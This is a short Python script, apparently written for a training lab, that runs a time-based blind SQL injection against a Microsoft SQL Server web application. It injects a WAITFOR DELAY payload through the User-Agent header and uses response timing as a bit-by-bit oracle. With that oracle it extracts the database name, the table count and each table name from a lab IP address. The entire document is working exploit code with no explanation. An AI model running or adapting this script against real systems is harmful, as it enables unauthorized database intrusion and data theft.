#!/usr/bin/python3

import requests
import time
import sys

# Define the length of time (in seconds) the server should wait if `q` is `true`
DELAY = 1

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Evaluates `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        "http://10.129.204.197:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"},
        proxies=proxy
    )
    return time.time() - start > DELAY

# Dump a number
def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

db_name_length = dumpNumber("LEN(DB_NAME())")
print(f"[*] DB name length = {db_name_length}")

# Dump a string
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

db_name = dumpString("DB_NAME()", db_name_length)
print(f"[*] DB name = {db_name}")


# Dump the num of table
num_tables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{db_name}'")
print(f"[+] Num of tables = {num_tables}")

# Dump the name of tables
for i in range(num_tables):
    table_name_length = dumpNumber(f"select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only")
    print(f"[+] Table {i} name length = {table_name_length}")
    table_name = dumpString(f"select table_name from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only", table_name_length)
    print(f"[+] Table {i} name = {table_name}")

